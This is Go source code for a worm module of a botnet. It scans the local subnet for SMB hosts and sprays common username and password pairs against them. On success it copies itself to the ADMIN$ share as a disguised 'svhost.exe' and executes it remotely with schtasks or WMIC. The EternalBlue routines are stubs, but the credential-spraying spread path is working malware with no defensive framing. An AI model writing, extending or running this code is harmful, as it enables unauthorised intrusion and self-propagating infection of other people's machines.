package main

import (
    "fmt"
    "net"
    "os/exec"
    "runtime"
    "strings"
    "sync"
    "time"
)

// ============================================================
// Worm Structure
// ============================================================

type Worm struct {
    targets   chan string
    wg        sync.WaitGroup
    exploited int
    running   bool
    mu        sync.Mutex
}

// Common SMB passwords for credential spraying
var commonPasswords = []string{
    "",
    "123456",
    "password",
    "admin",
    "Passw0rd",
    "Welcome1",
    "Password123",
    "Admin123",
    "qwerty",
    "12345678",
    "123123",
    "admin123",
    "P@ssw0rd",
    "passw0rd",
    "letmein",
    "monkey",
    "dragon",
    "master",
    "login",
    "secret",
}

// Common usernames to try
var commonUsernames = []string{
    "Administrator",
    "admin",
    "user",
    "guest",
    "backup",
    "test",
    "root",
}

// ============================================================
// New Worm Instance
// ============================================================

func NewWorm() *Worm {
    return &Worm{
        targets:   make(chan string, 1000),
        exploited: 0,
        running:   false,
    }
}

// ============================================================
// Main Spread Function
// ============================================================

func (w *Worm) Spread() {
    if w.running {
        fmt.Println("[*] Worm already running")
        return
    }
    
    w.running = true
    fmt.Println("[*] Worm module: scanning local network for targets")
    
    localIP := getLocalIP()
    if localIP == nil {
        fmt.Println("[!] Failed to get local IP address")
        return
    }
    
    // Get local subnet
    ipStr := localIP.String()
    parts := strings.Split(ipStr, ".")
    if len(parts) != 4 {
        fmt.Printf("[!] Invalid IP address format: %s\n", ipStr)
        return
    }
    
    subnet := parts[0] + "." + parts[1] + "." + parts[2]
    fmt.Printf("[*] Scanning subnet: %s.0/24\n", subnet)
    
    // Launch worker goroutines
    workers := 20
    for i := 0; i < workers; i++ {
        w.wg.Add(1)
        go w.worker()
    }
    
    // Feed targets into channel
    for i := 1; i < 255; i++ {
        targetIP := fmt.Sprintf("%s.%d", subnet, i)
        if targetIP != ipStr {
            w.targets <- targetIP
        }
    }
    close(w.targets)
    
    w.wg.Wait()
    w.running = false
    
    fmt.Printf("[+] Worm scan complete. Exploited %d machines.\n", w.exploited)
}

// ============================================================
// Worker Goroutine
// ============================================================

func (w *Worm) worker() {
    defer w.wg.Done()
    
    for targetIP := range w.targets {
        w.attemptExploit(targetIP)
    }
}

// ============================================================
// Attempt Exploit on Target
// ============================================================

func (w *Worm) attemptExploit(targetIP string) {
    // Check if port 445 is open (SMB)
    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", targetIP), 2*time.Second)
    if err != nil {
        return
    }
    conn.Close()
    
    fmt.Printf("[+] Found SMB target: %s\n", targetIP)
    
    // Try credential spraying with common username/password combinations
    for _, username := range commonUsernames {
        for _, password := range commonPasswords {
            if w.trySMBLogin(targetIP, username, password) {
                fmt.Printf("[!] Successful login: %s:%s@%s\n", username, password, targetIP)
                w.deployStager(targetIP, username, password)
                w.mu.Lock()
                w.exploited++
                w.mu.Unlock()
                return // Stop after first successful credential pair
            }
        }
    }
    
    // Try exploiting EternalBlue if available (requires meterpreter payload)
    // This is a placeholder for the actual exploit
    if w.tryEternalBlue(targetIP) {
        fmt.Printf("[!] EternalBlue exploit successful on %s\n", targetIP)
        w.deployStagerViaEternalBlue(targetIP)
        w.mu.Lock()
        w.exploited++
        w.mu.Unlock()
    }
}

// ============================================================
// SMB Login Attempt
// ============================================================

func (w *Worm) trySMBLogin(ip, username, password string) bool {
    // This is a simplified check. For actual SMB auth, you would:
    // 1. Use the Windows net use command (works on Windows bots)
    // 2. Use a Go SMB library
    // 3. Use a PowerShell script
    
    if runtime.GOOS == "windows" {
        // Windows bot - use net use command
        cmd := exec.Command("net", "use", fmt.Sprintf("\\\\%s\\IPC$", ip), password, "/USER:"+username)
        err := cmd.Run()
        if err == nil {
            // Clean up
            exec.Command("net", "use", fmt.Sprintf("\\\\%s\\IPC$", ip), "/delete").Run()
            return true
        }
    } else {
        // Linux bot - use smbclient or mount
        cmd := exec.Command("smbclient", fmt.Sprintf("//%s/IPC$", ip), "-U", username+"%"+password, "-c", "quit")
        err := cmd.Run()
        if err == nil {
            return true
        }
    }
    
    return false
}

// ============================================================
// Deploy Stager via SMB (Windows)
// ============================================================

func (w *Worm) deployStager(targetIP, username, password string) {
    fmt.Printf("[*] Deploying stager to %s\n", targetIP)
    
    // Get the current executable path (the bot itself)
    // We'll copy ourself to the target's ADMIN$ share
    currentExe, err := exec.LookPath(os.Args[0])
    if err != nil {
        fmt.Printf("[!] Failed to find current executable: %v\n", err)
        return
    }
    
    if runtime.GOOS == "windows" {
        // Windows-to-Windows deployment using net use and copy
        // Step 1: Map to ADMIN$ share
        mapCmd := exec.Command("net", "use", fmt.Sprintf("\\\\%s\\ADMIN$", targetIP), password, "/USER:"+username)
        if err := mapCmd.Run(); err != nil {
            fmt.Printf("[!] Failed to map ADMIN$ on %s: %v\n", targetIP, err)
            return
        }
        defer exec.Command("net", "use", fmt.Sprintf("\\\\%s\\ADMIN$", targetIP), "/delete").Run()
        
        // Step 2: Copy our executable
        copyCmd := exec.Command("copy", currentExe, fmt.Sprintf("\\\\%s\\ADMIN$\\svhost.exe", targetIP))
        if err := copyCmd.Run(); err != nil {
            fmt.Printf("[!] Failed to copy stager to %s: %v\n", targetIP, err)
            return
        }
        
        // Step 3: Execute via scheduled task or WMI
        schtaskCmd := exec.Command("schtasks", "/create", "/s", targetIP, "/u", username, "/p", password,
            "/tn", "SystemUpdate", "/tr", "C:\\Windows\\svhost.exe", "/sc", "once", "/st", "00:00", "/f")
        if err := schtaskCmd.Run(); err != nil {
            // Fallback to WMI
            wmicCmd := exec.Command("wmic", "/node:"+targetIP, "/user:"+username, "/password:"+password,
                "process", "call", "create", "C:\\Windows\\svhost.exe")
            wmicCmd.Run()
        }
        
        fmt.Printf("[+] Stager deployed to %s\n", targetIP)
    } else {
        // Linux-to-Windows deployment (requires smbclient)
        copyCmd := exec.Command("smbclient", fmt.Sprintf("//%s/ADMIN$", targetIP), "-U", username+"%"+password,
            "-c", fmt.Sprintf("put %s svhost.exe", currentExe))
        if err := copyCmd.Run(); err != nil {
            fmt.Printf("[!] Failed to copy via smbclient: %v\n", err)
            return
        }
        
        fmt.Printf("[+] Stager deployed to %s via smbclient\n", targetIP)
    }
}

// ============================================================
// Deploy via EternalBlue (Simplified)
// ============================================================

func (w *Worm) tryEternalBlue(targetIP string) bool {
    // EternalBlue detection - check if port 445 responds to specific probes
    // This is a simplified version. Full implementation would use:
    // - MS17-010 detection via SMB_COM_NEGOTIATE
    // - DoublePulsar backdoor injection
    
    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", targetIP), 3*time.Second)
    if err != nil {
        return false
    }
    defer conn.Close()
    
    // Send a malformed SMB packet to detect vulnerability
    // This is a placeholder - actual implementation requires SMB protocol knowledge
    // Use a pre-compiled EternalBlue binary or implement in Go
    
    // For now, return false and rely on credential spraying
    return false
}

func (w *Worm) deployStagerViaEternalBlue(targetIP string) {
    fmt.Printf("[*] Deploying stager to %s via EternalBlue\n", targetIP)
    
    // This would inject shellcode directly into memory
    // The shellcode would download and execute the full bot
    // For implementation, see the EternalBlue module in metasploit or other open source tools
    
    // Placeholder - in production, call an external binary or implement in Go
}

// ============================================================
// Get Local IP Helper (Same as in main.go)
// ============================================================

func getLocalIP() net.IP {
    conn, err := net.Dial("udp", "8.8.8.8:80")
    if err != nil {
        return nil
    }
    defer conn.Close()
    
    localAddr := conn.LocalAddr().(*net.UDPAddr)
    return localAddr.IP
}
